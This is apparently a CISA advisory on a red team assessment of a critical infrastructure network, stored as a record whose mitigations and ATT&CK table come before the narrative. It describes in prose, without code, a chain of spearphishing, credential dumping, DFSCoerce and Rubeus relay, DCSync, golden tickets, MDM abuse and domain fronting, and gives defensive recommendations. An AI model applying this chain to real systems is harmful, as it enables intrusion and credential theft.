MITIGATIONS
CISA recommends organizations implement the recommendations in Table 2 to mitigate the issues listed in the Findings section of this advisory. These mitigations align with the Cross-Sector Cybersecurity Performance Goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. See CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Table 2: Recommendations to Mitigate Identified Issues


Issue
Recommendation




Insufficient host and network monitoring


Establish a security baseline of normal network traffic and tune network appliances to detect anomalous behavior [CPG 3.1]. Tune host-based products to detect anomalous binaries, lateral movement, and persistence techniques.
Create alerts for Windows event log authentication codes, especially for the domain controllers. This could help detect some of the pass-the-ticket, DCSync, and other techniques described in this report.
From a detection standpoint, focus on identity and access management (IAM) rather than just network traffic or static host alerts.
Consider who is accessing what (what resource), from where (what internal host or external location), and when (what day and time the access occurs).
Look for access behavior that deviates from expected or is indicative of AD abuse.
Reduce the attack surface by limiting the use of legitimate administrative pathways and tools such as PowerShell, PSExec, and WMI, which are often used by malicious actors. CISA recommends selecting one tool to administer the network, ensuring logging is turned on [CPG 3.1], and disabling the others.
Consider using “honeypot” service principal names (SPNs) to detect attempts to crack account hashes [CPG 1.1].
Conduct regular assessments to ensure processes and procedures are up to date and can be followed by security staff and end users.
Consider using red team tools, such as SharpHound, for AD enumeration to identify users with excessive privileges and misconfigured hosts (e.g., with Unconstrained Delegation enabled).
Ensure all commercial tools deployed in your environment are regularly tuned to pick up on relevant activity in your environment.




Lack of monitoring on endpoint management systems


Treat endpoint management systems as HVAs with additional restrictions and monitoring because they provide elevated access to thousands of hosts.




KRBTGT never changed


Change the krbtgt account password on a regular schedule such as every 6 to 12 months or if it becomes compromised. Note that this password change must be carefully performed to effectively change the credential without breaking AD functionality. The password must be changed twice to effectively invalidate the old credentials. However, the required waiting period between resets must be greater than the maximum lifetime period of Kerberos tickets, which is 10 hours by default. See Microsoft’s KRBTGT account maintenance considerations guidance for more information.




Excessive permissions to standard users and ineffective separation of privileged accounts


Implement the principle of least privilege:
Grant standard user rights for standard user tasks such as email, web browsing, and using line-of-business (LOB) applications.
Periodically audit standard accounts and minimize where they have privileged access.
Periodically Audit AD permissions to ensure users do not have excessive permissions and have not been added to admin groups.
Evaluate which administrative groups should administer which servers/workstations. Ensure group members administrative accounts instead of standard accounts.
Separate administrator accounts from user accounts [CPG 1.5]. Only allow designated admin accounts to be used for admin purposes. If an individual user needs administrative rights over their workstation, use a separate account that does not have administrative access to other hosts, such as servers.
Consider using a privileged access management (PAM) solution to manage access to privileged accounts and resources [CPG 3.4]. PAM solutions can also log and alert usage to detect any unusual activity and may have helped stop the red team from accessing resources with admin accounts. Note: password vaults associated with PAM solutions should be treated as HVAs with additional restrictions and monitoring (see below).
Configure time-based access for accounts set at the admin level and higher. For example, the just-in-time (JIT) access method provisions privileged access when needed and can support enforcement of the principle of least privilege, as well as the Zero Trust model. This is a process in which a network-wide policy is set in place to automatically disable administrator accounts at the AD level when the account is not in direct need. When individual users need the account, they submit their requests through an automated process that enables access to a system but only for a set timeframe to support task completion.




Hosts with Unconstrained Delegation enabled


Remove Unconstrained Delegation from all servers. If Unconstrained Delegation functionality is required, upgrade operating systems and applications to leverage other approaches (e.g., constrained delegation) or explore whether systems can be retired or further isolated from the enterprise. CISA recommends Windows Server 2019 or greater.
Consider disabling or limiting NTLM and WDigest Authentication if possible, including using their use as criteria for prioritizing updates to legacy systems or for segmenting the network. Instead use more modern federation protocols (SAML, OIDC) or Kerberos for authentication with AES-256 bit encryption [CPG 3.4].
If NTLM must be enabled, enable Extended Protection for Authentication (EPA) to prevent some NTLM-relay attacks, and implement SMB signing to prevent certain adversary-in-the-middle and pass-the-hash attacks CPG 3.4]. See Microsoft Mitigating NTLM Relay Attacks on Active Directory Certificate Services (AD CS) and Microsoft Overview of Server Message Block signing for more information.




Use of non-secure default configurations


Keep systems and software up to date [CPG 5.1]. If updates cannot be uniformly installed, update insecure configurations to meet updated standards.




Lack of server egress control


Configure internal firewalls and proxies to restrict internet traffic from hosts that do not require it. If a host requires specific outbound traffic, consider creating an allowlist policy of domains.




Large number of credentials in a shared vault


Treat password vaults as HVAs with additional restrictions and monitoring [CPG 3.4]:
If on-premise, require MFA for admin and apply network segmentation [CPG 1.3]. Use solutions with end-to-end encryption where applicable [CPG 3.3].
If cloud-based, evaluate the provider to ensure use of strong security controls such as MFA and end-to-end encryption [CPG 1.3, 3.3].




Inconsistent host configuration


Establish a baseline/gold-image for workstations and servers and deploy from that image [CPG 2.5]. Use standardized groups to administer hosts in the network.




Potentially unwanted programs


Implement software allowlisting to ensure users can only install software from an approved list [CPG 2.1].
Remove unnecessary, extraneous software from servers and workstations.




Mandatory password changes enabled


Consider only requiring changes for memorized passwords in the event of compromise. Regular changing of memorized passwords can lead to predictable patterns, and both CISA and the National Institute of Standards and Technology (NIST) recommend against changing passwords on regular intervals.





Additionally, CISA recommends organizations implement the mitigations below to improve their cybersecurity posture:

Provide users with regular training and exercises, specifically related to phishing emails [CPG 4.3]. Phishing accounts for majority of initial access intrusion events.
Enforce phishing-resistant MFA to the greatest extent possible [CPG 1.3].
Reduce the risk of credential compromise via the following:

Place domain admin accounts in the protected users group to prevent caching of password hashes locally; this also forces Kerberos AES authentication as opposed to weaker RC4 or NTLM.
Implement Credential Guard for Windows 10 and Server 2016 (Refer to Microsoft: Manage Windows Defender Credential Guard for more information). For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA).
Refrain from storing plaintext credentials in scripts [CPG 3.4]. The red team discovered a PowerShell script containing plaintext credentials that allowed them to escalate to admin.


Upgrade to Windows Server 2019 or greater and Windows 10 or greater. These versions have security features not included in older operating systems.

As a long-term effort, CISA recommends organizations prioritize implementing a more modern, Zero Trust network architecture that:

Leverages secure cloud services for key enterprise security capabilities (e.g., identity and access management, endpoint detection and response, policy enforcement).
Upgrades applications and infrastructure to leverage modern identity management and network access practices.
Centralizes and streamlines access to cybersecurity data to drive analytics for identifying and managing cybersecurity risks.
Invests in technology and personnel to achieve these goals.

CISA encourages organizational IT leadership to ask their executive leadership the question: Can the organization accept the business risk of NOT implementing critical security controls such as MFA? Risks of that nature should typically be acknowledged and prioritized at the most senior levels of an organization.
VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 3).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA recommends continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES
See CISA’s RedEye tool on CISA’s GitHub page. RedEye is an interactive open-source analytic tool used to visualize and report red team command and control activities. See CISA’s RedEye tool overview video for more information.
REFERENCES[1] Bleeping Computer: New DFSCoerce NTLM Relay attack allows Windows domain takeover
APPENDIX: MITRE ATT&CK TACTICS AND TECHNIQUES
See the tables below for all referenced red team tactics and techniques in this advisory. Note: Activity was from Phase I unless noted.



Reconnaissance


Technique Title
ID
Use




Gather Victim Identity Information: Email Addresses
T1589.002
The team found employee email addresses via open-source research.


Gather Victim Identify Information: Employee Names
T1589.003
The team identified employee names via open-source research that could be used to derive email addresses.


Gather Victim Network Information: Network Security Appliances
T1590.006
The team identified the organization’s MDM vendor and leveraged that information to move laterally to SBS-connected assets.


Gather Victim Org Information
T1591
The team conducted open-source research and identified an organizational branch that likely had access to an SBS asset.


Gather Victim Org Information: Determine Physical Locations
T1591.001
The team conducted open-source research to identify the physical locations of upkeep/management staff of selected assets.


Search Open Technical Databases: Scan Databases
T1596.005
The team queried an MDM SQL database to identify target administrators who recently connected with the MDM.






Resource Development


Technique Title
ID
Use




Acquire Infrastructure
T1583
The team used third-party owned and operated infrastructure throughout their assessment for C2.


Establish Accounts: Email Accounts
T1585.002
The team used commercially available email platforms for their spearphishing activity.


Obtain Capabilities: Tool
T1588.002

The team used the following tools:

Cobalt Strike and Merlin payloads for C2.
KeeThief to obtain a decryption key from a KeePass database
Rubeus and DFSCoerce in an NTLM relay attack








Initial Access


Technique Title
ID
Use




Phishing: Spearphishing Link
T1566.002
The team sent spearphishing emails with links to a red-team-controlled domain to gain access to the organization’s systems.






Execution


Technique Title
ID
Use




Native API
T1106
The team created a policy via the MDM API, which downloaded and executed a payload on a workstation.


User Execution
T1204
Users downloaded and executed the team’s initial access payloads after clicking buttons to trigger download and execution.






Persistence


Technique Title
ID
Use




Account Manipulation
T1098

The team elevated account privileges to administrator and modified the user’s account by adding Create Policy and Delete Policy permissions.
During Phase II, the team created local admin accounts and an AD account; they added the created AD account to a domain admins group.



Create Account: Local Account
T1136.001
During Phase II, the team created a local administrator account on a workstation and a server.


Create Account: Domain Account
T1136.002
During Phase II, the team created an AD account.


Create or Modify System Process: Windows Service
T1543.003
During Phase II, the team leveraged compromised workstation and domain admin accounts to execute a payload via Windows Service Creation on target workstations and the DC.


Event Triggered Execution: Windows Management Instrumentation Event Subscription
T1546.003
The team used WMI Event Subscriptions to move laterally between sites.


Hijack Execution Flow: DLL Search Order Hijacking
T1574.001
The team used DLL hijacking to move laterally between sites.






Privilege Escalation


Technique Title
ID
Use




Abuse Elevation Control Mechanism
T1548
The team elevated user account privileges to administrator by modifying the user’s account via adding Create Policy and Delete Policy permissions.






Defense Evasion


Technique Title
ID
Use




Valid Accounts: Domain Accounts
T1078.002
During Phase II, the team compromised a domain admin account and used it to laterally to multiple workstations and the DC.






Credential Access


Technique Title
ID
Use




OS Credential Dumping: LSASS Memory
T1003.001
The team obtained the cached credentials from a SharePoint server account by taking a snapshot of lsass.exe with a tool called nanodump, exporting the output and processing the output offline with Mimikatz.


OS Credential Dumping: DCSync
T1003.006
The team harvested AES-256 hashes via DCSync.


Brute Force: Password Cracking
T1110.002
The team cracked a user’s workstation account password after learning the user’s patterns from plaintext credentials.


Unsecured Credentials
T1552
The team found backups of a MySQL database that contained the encryption key needed to decrypt SSH passwords.


Unsecured Credentials: Credentials in Files
T1552.001
The team found plaintext credentials to an API user account stored in PowerShell scripts on an MDM server.


Unsecured Credentials: Bash History
T1552.003
The team found bash history files on a Workstation 5, and the files appeared to be SSH passwords saved in bash history.


Credentials from Password Stores: Password Managers
T1555.005
The team pulled credentials from a KeePass database.


Adversary-in-the-middle: LLMNR/NBT-NS Poisoning and SMB Relay
T1557.001
The team ran the DFSCoerce python script, which prompted DC authentication to a server using the server’s NTLM hash. The team then deployed Rubeus to capture the incoming DC TGT.


Steal or Forge Kerberos Tickets: Golden Ticket
T1558.001
The team used the acquired krbtgt account hash throughout their assessment to forge legitimate TGTs.


Steal or Forge Kerberos Tickets: Kerberoasting
T1558.003
The team leveraged Rubeus and DFSCoerce in a NTLM relay attack to obtain the DC’s TGT from a host with Unconstrained Delegation enabled.






Discovery


Technique Title
ID
Use




System Network Configuration Discovery
T1016
The team queried the AD for information about the network's sites and subnets. 


Remote System Discovery
T1018
The team queried the AD, during phase I and II, for information about computers on the network. 


System Network Connections Discovery
T1049
The team listed existing network connections on SCCM Server 1 to reveal an active SMB connection with server 2.


Permission Groups Discovery: Domain Groups
T1069.002
The team leveraged ldapsearch and dsquery to query and scrape active directory information. 


Account Discovery: Domain Account
T1087.002
The team queried AD for AD users (during Phase I and II), including for members of a SharePoint admin group and several standard user accounts with administrative access.


Cloud Infrastructure Discovery
T1580
The team found SecOps network diagrams on a host detailing cloud infrastructure boundaries.


Domain Trust Discovery
T1482
During Phase II, the team enumerated trust relationships within the AD Forest.


Group Policy Discovery
T1615
The team scraped AD information, including GPOs.


Network Service Discovery
T1046
During Phase II, the team enumerated ports on target systems from a previously compromised workstation.


System Owner/User Discovery
T1033
During Phase II, the team enumerated the AD for current session information from every domain computer (Workstation and Server).






Lateral Movement


Technique Title
ID
Use




Remote Services: SMB/Windows Admin Shares
T1021.002

The team moved laterally with an SMB beacon.
During Phase II, they used compromised workstation and domain admin accounts to upload a payload via SMB on several target Workstations and the DC.



Use Alternate Authentication Material: Pass the Hash
T1550.002
The team ran the DFSCoerce python script, which prompted DC authentication to a server using the server’s NTLM hash. The team then deployed Rubeus to capture the incoming DC TGT.


Pass the Ticket
T1550.003
The team used the asktgt command to impersonate accounts for which they had credentials by requesting account TGTs.






Command and Control


Technique Title
ID
Use




Application Layer Protocol
T1071

The team remotely enumerated the local administrators group on target hosts to find valid user accounts. This technique relies on anonymous SMB pipe binds, which are disabled by default starting with Server 2016.
During Phase II, the team established sessions that originated from a target Workstation and from the DC directly to an external host over a clear text protocol.



Application Layer Protocol: Web Protocols
T1071.001
The team’s C2 redirectors used HTTPS reverse proxies to redirect C2 traffic.


Application Layer Protocol: File Transfer Protocols
T1071.002
The team used HTTPS reverse proxies to redirect C2 traffic between target network and the team’s Cobalt Strike servers.


Encrypted Channel
T1573
The team’s C2 traffic was encrypted in transit using encryption keys stored on their C2 servers.


Ingress Tool Transfer
T1105
During Phase II, the team uploaded and executed well-known malicious files to the DC to generate host-based alerts.


Proxy: External Proxy
T1090.002
The team used redirectors to redirect C2 traffic between the target organization’s network and the team’s C2 servers.


Proxy: Domain Fronting
T1090.004
The team used domain fronting to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating.






Impact


Technique Title
ID
Use




Account Access Removal
T1531
During Phase II, the team locked out several administrative AD accounts.









This product is provided subject to this Notification and this Privacy & Use policy.


","{'TA0008', 'T1090.002', 'T1566.002', 'T1071.002', 'T1021.002', 'T1558.003', 'T1136.002', 'T1098', 'T1531', 'T1550.003', 'T1588.002', 'T1552', 'T1573', 'T1482', 'T1615', 'T1016', 'T1589.003', 'T1583', 'T1558.001', 'T1087.002', 'T1069.002', 'T1546.003', 'T1003.001', 'T1018', 'T1596.005', 'T1110.002', 'T1105', 'T1049', 'TA0043', 'TA0011', 'T1204', 'T1550.002', 'T1078.002', 'T1591.001', 'T1543.003', 'T1552.001', 'T1585.002', 'TA0001', 'T1046', 'T1574.001', 'T1555.005', 'T1003.006', 'T1071', 'T1552.003', 'T1033', 'T1548', 'T1090.004', 'T1136.001', 'T1071.001', 'T1557.001', 'T1106', 'T1580', 'T1590.006', 'T1048', 'T1591', 'T1589.002'}","






Actions to take today to harden your local environment:




Establish a security baseline of normal network activity; tune network and host-based appliances to detect anomalous behavior.
Conduct regular assessments to ensure appropriate procedures are created and can be followed by security staff and end users.
Enforce phishing-resistant MFA to the greatest extent possible.







SUMMARY
The Cybersecurity and Infrastructure Security Agency (CISA) is releasing this Cybersecurity Advisory (CSA) detailing activity and key findings from a recent CISA red team assessment—in coordination with the assessed organization—to provide network defenders recommendations for improving their organization's cyber posture.
In 2022, CISA conducted a red team assessment (RTA) at the request of a large critical infrastructure organization with multiple geographically separated sites. The team gained persistent access to the organization’s network, moved laterally across the organization’s multiple geographically separated sites, and eventually gained access to systems adjacent to the organization’s sensitive business systems (SBSs). Multifactor authentication (MFA) prompts prevented the team from achieving access to one SBS, and the team was unable to complete its viable plan to compromise a second SBSs within the assessment period.
Despite having a mature cyber posture, the organization did not detect the red team’s activity throughout the assessment, including when the team attempted to trigger a security response.
CISA is releasing this CSA detailing the red team’s tactics, techniques, and procedures (TTPs) and key findings to provide network defenders of critical infrastructure organizations proactive steps to reduce the threat of similar activity from malicious cyber actors. This CSA highlights the importance of collecting and monitoring logs for unusual activity as well as continuous testing and exercises to ensure your organization’s environment is not vulnerable to compromise, regardless of the maturity of its cyber posture.
CISA encourages critical infrastructure organizations to apply the recommendations in the Mitigations section of this CSA—including conduct regular testing within their security operations center—to ensure security processes and procedures are up to date, effective, and enable timely detection and mitigation of malicious activity.
Download the PDF version of this report:


CISA Red Team Shares Key Findings to Improve Monitoring and Hardening of Networks
(PDF,       1.06 MB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See the appendix for a table of the red team’s activity mapped to MITRE ATT&CK tactics and techniques.
Introduction
CISA has authority to, upon request, provide analyses, expertise, and other technical assistance to critical infrastructure owners and operators and provide operational and timely technical assistance to Federal and non-Federal entities with respect to cybersecurity risks. (See generally 6 U.S.C. §§ 652,c,5, 659,c,6,.) After receiving a request for a red team assessment (RTA) from an organization and coordinating some high-level details of the engagement with certain personnel at the organization, CISA conducted the RTA over a three-month period in 2022.
During RTAs, a CISA red team emulates cyber threat actors to assess an organization’s cyber detection and response capabilities. During Phase I, the red team attempts to gain and maintain persistent access to an organization’s enterprise network while avoiding detection and evading defenses. During Phase II, the red team attempts to trigger a security response from the organization’s people, processes, or technology.
The “victim” for this assessment was a large organization with multiple geographically separated sites throughout the United States. For this assessment, the red team’s goal during Phase I was to gain access to certain sensitive business systems (SBSs).
Phase I: Red Team Cyber Threat Activity
Overview
The organization’s network was segmented with both logical and geographical boundaries. CISA’s red team gained initial access to two organization workstations at separate sites via spearphishing emails. After gaining access and leveraging Active Directory (AD) data, the team gained persistent access to a third host via spearphishing emails. From that host, the team moved laterally to a misconfigured server, from which they compromised the domain controller (DC). They then used forged credentials to move to multiple hosts across different sites in the environment and eventually gained root access to all workstations connected to the organization’s mobile device management (MDM) server. The team used this root access to move laterally to SBS-connected workstations. However, a multifactor authentication (MFA) prompt prevented the team from achieving access to one SBS, and Phase I ended before the team could implement a seemingly viable plan to achieve access to a second SBS.
Initial Access and Active Directory Discovery
The CISA red team gained initial access, to two workstations at geographically separated sites (Site 1 and Site 2) via spearphishing emails. The team first conducted open-source research, to identify potential targets for spearphishing. Specifically, the team looked for email addresses, as well as names, that could be used to derive email addresses based on the team’s identification of the email naming scheme. The red team sent tailored spearphishing emails to seven targets using commercially available email platforms,. The team used the logging and tracking features of one of the platforms to analyze the organization’s email filtering defenses and confirm the emails had reached the target’s inbox.
The team built a rapport with some targeted individuals through emails, eventually leading these individuals to accept a virtual meeting invite. The meeting invite took them to a red team-controlled domain, with a button, which, when clicked, downloaded a “malicious” ISO file,. After the download, another button appeared, which, when clicked, executed the file.
Two of the seven targets responded to the phishing attempt, giving the red team access to a workstation at Site 1 (Workstation 1) and a workstation at Site 2. On Workstation 1, the team leveraged a modified SharpHound collector, ldapsearch, and command-line tool, dsquery, to query and scrape AD information, including AD users, computers, groups, access control lists (ACLs), organizational units (OU), and group policy objects (GPOs),. Note: SharpHound is a BloodHound collector, an open-source AD reconnaissance tool. Bloodhound has multiple collectors that assist with information querying.
There were 52 hosts in the AD that had Unconstrained Delegation enabled and a lastlogon timestamp within 30 days of the query. Hosts with Unconstrained Delegation enabled store Kerberos ticket-granting tickets (TGTs) of all users that have authenticated to that host. Many of these hosts, including a Site 1 SharePoint server, were Windows Server 2012R2. The default configuration of Windows Server 2012R2 allows unprivileged users to query group membership of local administrator groups.
The red team queried parsed Bloodhound data for members of the SharePoint admin group and identified several standard user accounts with administrative access. The team initiated a second spearphishing campaign, similar to the first, to target these users. One user triggered the red team’s payload, which led to installation of a persistent beacon on the user’s workstation (Workstation 2), giving the team persistent access to Workstation 2.
Lateral Movement, Credential Access, and Persistence
The red team moved laterally, from Workstation 2 to the Site 1 SharePoint server and had SYSTEM level access to the Site 1 SharePoint server, which had Unconstrained Delegation enabled. They used this access to obtain the cached credentials of all logged-in users—including the New Technology Local Area Network Manager (NTLM) hash for the SharePoint server account. To obtain the credentials, the team took a snapshot of lsass.exe, with a tool called nanodump, exported the output, and processed the output offline with Mimikatz.
The team then exploited the Unconstrained Delegation misconfiguration to steal the DC’s TGT. They ran the DFSCoerce python script (DFSCoerce.py), which prompted DC authentication to the SharePoint server using the server’s NTLM hash. The team then deployed Rubeus to capture the incoming DC TGT,. (DFSCoerce abuses Microsoft's Distributed File System,MS-DFSNM, protocol to relay authentication against an arbitrary server.,1,)
The team then used the TGT to harvest advanced encryption standard (AES)-256 hashes via DCSync, for the krbtgt account and several privileged accounts—including domain admins, workstation admins, and a system center configuration management (SCCM) service account (SCCM Account 1). The team used the krbtgt account hash throughout the rest of their assessment to perform golden ticket attacks, in which they forged legitimate TGTs. The team also used the asktgt command to impersonate accounts they had credentials for by requesting account TGTs,.
The team first impersonated the SCCM Account 1 and moved laterally to a Site 1 SCCM distribution point (DP) server (SCCM Server 1) that had direct network access to Workstation 2. The team then moved from SCCM Server 1 to a central SCCM server (SCCM Server 2) at a third site (Site 3). Specifically, the team:

Queried the AD using Lightweight Directory Access Protocol (LDAP) for information about the network's sites and subnets,. This query revealed all organization sites and subnets broken down by classless inter-domain routing (CIDR) subnet and description.
Used LDAP queries and domain name system (DNS) requests to identify recently active hosts.
Listed existing network connections, on SCCM Server 1, which revealed an active Server Message Block (SMB) connection from SCCM Server 2.
Attempted to move laterally to the SCCM Server 2 via AppDomain hijacking, but the HTTPS beacon failed to call back.
Attempted to move laterally with an SMB beacon, which was successful.

The team also moved from SCCM Server 1 to a Site 1 workstation (Workstation 3) that housed an active server administrator. The team impersonated an administrative service account via a golden ticket attack (from SCCM Server 1); the account had administrative privileges on Workstation 3. The user employed a KeePass password manager that the team was able to use to obtain passwords for other internal websites, a kernel-based virtual machine (KVM) server, virtual private network (VPN) endpoints, firewalls, and another KeePass database with credentials. The server administrator relied on a password manager, which stored credentials in a database file. The red team pulled the decryption key from memory using KeeThief and used it to unlock the database,.
At the organization’s request, the red team confirmed that SCCM Server 2 provided access to the organization’s sites because firewall rules allowed SMB traffic to SCCM servers at all other sites.
The team moved laterally from SCCM Server 2 to an SCCM DP server at Site 5 and from the SCCM Server 1 to hosts at two other sites (Sites 4 and 6). The team installed persistent beacons at each of these sites. Site 5 was broken into a private and a public subnet and only DCs were able to cross that boundary. To move between the subnets, the team moved through DCs. Specifically, the team moved from the Site 5 SCCM DP server to a public DC; and then they moved from the public DC to the private DC. The team was then able to move from the private DC to workstations in the private subnet.
The team leveraged access available from SCCM 2 to move around the organization’s network for post-exploitation activities (See Post-Exploitation Activity section).
See Figure 1 for a timeline of the red team’s initial access and lateral movement showing key access points.

 

Figure 1: Red Team Cyber Threat Activity: Initial Access and Lateral Movement

While traversing the network, the team varied their lateral movement techniques to evade detection and because the organization had non-uniform firewalls between the sites and within the sites (within the sites, firewalls were configured by subnet). The team’s primary methods to move between sites were AppDomainManager hijacking and dynamic-link library (DLL) hijacking,. In some instances, they used Windows Management Instrumentation (WMI) Event Subscriptions,.
The team impersonated several accounts to evade detection while moving. When possible, the team remotely enumerated the local administrators group on target hosts to find a valid user account. This technique relies on anonymous SMB pipe binds, which are disabled by default starting with Windows Server 2016. In other cases, the team attempted to determine valid accounts based on group name and purpose. If the team had previously acquired the credentials, they used asktgt to impersonate the account. If the team did not have the credentials, they used the golden ticket attack to forge the account.
Post-Exploitation Activity: Gaining Access to SBSs
With persistent, deep access established across the organization’s networks and subnetworks, the red team began post-exploitation activities and attempted to access SBSs. Trusted agents of the organization tasked the team with gaining access to two specialized servers (SBS 1 and SBS 2). The team achieved root access to three SBS-adjacent workstations but was unable to move laterally to the SBS servers:

Phase I ended before the team could implement a plan to move to SBS 1.
An MFA prompt blocked the team from moving to SBS 2, and Phase I ended before they could implement potential workarounds.

However, the team assesses that by using Secure Shell (SSH) session socket files (see below), they could have accessed any hosts available to the users whose workstations were compromised.
Plan for Potential Access to SBS 1
Conducting open-source research,1591.001, the team identified that SBS 1 and 2 assets and associated management/upkeep staff were located at Sites 5 and 6, respectively. Adding previously collected AD data to this discovery, the team was able to identify a specific SBS 1 admin account. The team planned to use the organization’s mobile device management (MDM) software to move laterally to the SBS 1 administrator’s workstation and, from there, pivot to SBS 1 assets.
The team identified the organization’s MDM vendor using open-source and AD information, and moved laterally to an MDM distribution point server at Site 5 (MDM DP 1). This server contained backups of the MDM MySQL database on its D: drive in the Backup directory. The backups included the encryption key needed to decrypt any encrypted values, such as SSH passwords,. The database backup identified both the user of the SBS 1 administrator account (USER 2) and the user’s workstation (Workstation 4), which the MDM software remotely administered.
The team moved laterally to an MDM server (MDM 1) at Site 3, searched files on the server, and found plaintext credentials, to an application programming interface (API) user account stored in PowerShell scripts. The team attempted to leverage these credentials to browse to the web login page of the MDM vendor but were unable to do so because the website directed to an organization-controlled single-sign on (SSO) authentication page.
The team gained root access to workstations connected to MDM 1—specifically, the team accessed Workstation 4—by:

Selecting an MDM user from the plaintext credentials in PowerShell scripts on MDM 1.
While in the MDM MySQL database,

Elevating the selected MDM user’s account privileges to administrator privileges, and
Modifying the user’s account by adding Create Policy and Delete Policy permissions,.


Creating a policy via the MDM API, which instructed Workstation 4 to download and execute a payload to give the team interactive access as root to the workstation.
Verifying their interactive access.
Resetting permissions back to their original state by removing the policy via the MDM API and removing Create Policy and Delete Policy and administrator permissions and from the MDM user’s account.

While interacting with Workstation 4, the team found an open SSH socket file and a corresponding netstat connection to a host that the team identified as a bastion host from architecture documentation found on Workstation 4. The team planned to move from Workstation 4 to the bastion host to SBS 1. Note: A SSH socket file allows a user to open multiple SSH sessions through a single, already authenticated SSH connection without additional authentication.
The team could not take advantage of the open SSH socket. Instead, they searched through SBS 1 architecture diagrams and documentation on Workstation 4. They found a security operations (SecOps) network diagram detailing the network boundaries between Site 5 SecOps on-premises systems, Site 5 non-SecOps on-premises systems, and Site 5 SecOps cloud infrastructure. The documentation listed the SecOps cloud infrastructure IP ranges,. These “trusted” IP addresses were a public /16 subnet; the team was able to request a public IP in that range from the same cloud provider, and Workstation 4 made successful outbound SSH connections to this cloud infrastructure. The team intended to use that connection to reverse tunnel traffic back to the workstation and then access the bastion host via the open SSH socket file. However, Phase 1 ended before they were able to implement this plan.
Attempts to Access SBS 2
Conducting open-source research, the team identified an organizational branch, that likely had access to SBS 2. The team queried the AD to identify the branch’s users and administrators. The team gathered a list of potential accounts, from which they identified administrators, such as SYSTEMS ADMIN or DATA SYSTEMS ADMINISTRATOR, with technical roles. Using their access to the MDM MySQL database, the team queried potential targets to (1) determine the target’s last contact time with the MDM and (2) ensure any policy targeting the target’s workstation would run relatively quickly,. Using the same methodology as described by the steps in the Plan for Potential Access to SBS 1 section above, the team gained interactive root access to two Site 6 SBS 2-connected workstations: a software engineering workstation (Workstation 5) and a user administrator workstation (Workstation 6).
The Workstation 5 user had bash history files with what appeared to be SSH passwords mistyped into the bash prompt and saved in bash history,. The team then attempted to authenticate to SBS 2 using a similar tunnel setup as described in the Access to SBS 1 section above and the potential credentials from the user’s bash history file. However, this attempt was unsuccessful for unknown reasons.
On Workstation 6, the team found a .txt file containing plaintext credentials for the user. Using the pattern discovered in these credentials, the team was able to crack the user’s workstation account password,. The team also discovered potential passwords and SSH connection commands in the user’s bash history. Using a similar tunnel setup described above, the team attempted to log into SBS 2. However, a prompt for an MFA passcode blocked this attempt.
See figure 2 for a timeline of the team’s post exploitation activity that includes key points of access.

 

Figure 2: Red Team Cyber Threat Activity: Post Exploitation

Command and Control
The team used third-party owned and operated infrastructure and services, throughout their assessment, including in certain cases for command and control (C2),. These included:

Cobalt Strike and Merlin payloads for C2 throughout the assessment. Note: Merlin is a post-exploit tool that leverages HTTP protocols for C2 traffic.

The team maintained multiple Cobalt Strike servers hosted by a cloud vendor. They configured each server with a different domain and used the servers for communication with compromised hosts. These servers retained all assessment data.


Two commercially available cloud-computing platforms.

The team used these platforms to create flexible and dynamic redirect servers to send traffic to the team’s Cobalt Strike servers,. Redirecting servers make it difficult for defenders to attribute assessment activities to the backend team servers. The redirectors used HTTPS reverse proxies to redirect C2 traffic between the target organization’s network and the Cobalt Strike team servers,. The team encrypted all data in transit, using encryption keys stored on team’s Cobalt Strike servers.


A cloud service to rapidly change the IP address of the team’s redirecting servers in the event of detection and eradication.
Content delivery network (CDN) services to further obfuscate some of the team’s C2 traffic.

This technique leverages CDNs associated with high-reputation domains so that the malicious traffic appears to be directed towards a reputation domain but is actually redirected to the red team-controlled Cobalt Strike servers.
The team used domain fronting, to disguise outbound traffic in order to diversify the domains with which the persistent beacons were communicating. This technique, which also leverages CDNs, allows the beacon to appear to connect to third-party domains, such as nytimes.com, when it is actually connecting to the team’s redirect server.



Phase II: Red Team Measurable Events Activity
The red team executed 13 measurable events designed to provoke a response from the people, processes, and technology defending the organization’s network. See Table 1 for a description of the events, the expected network defender activity, and the organization’s actual response.

Findings
Key Issues
The red team noted the following key issues relevant to the security of the organization’s network. These findings contributed to the team’s ability to gain persistent, undetected access across the organization’s sites. See the Mitigations section for recommendations on how to mitigate these issues.

Insufficient host and network monitoring. Most of the red team’s Phase II actions failed to provoke a response from the people, processes, and technology defending the organization’s network. The organization failed to detect lateral movement, persistence, and C2 activity via their intrusion detection or prevention systems, endpoint protection platform, web proxy logs, and Windows event logs. Additionally, throughout Phase I, the team received no deconflictions or confirmation that the organization caught their activity. Below is a list of some of the higher risk activities conducted by the team that were opportunities for detection:

Phishing
Lateral movement reuse
Generation and use of the golden ticket
Anomalous LDAP traffic
Anomalous internal share enumeration
Unconstrained Delegation server compromise
DCSync
Anomalous account usage during lateral movement
Anomalous outbound network traffic
Anomalous outbound SSH connections to the team’s cloud servers from workstations


Lack of monitoring on endpoint management systems. The team used the organization’s MDM system to gain root access to machines across the organization’s network without being detected. Endpoint management systems provide elevated access to thousands of hosts and should be treated as high value assets (HVAs) with additional restrictions and monitoring.
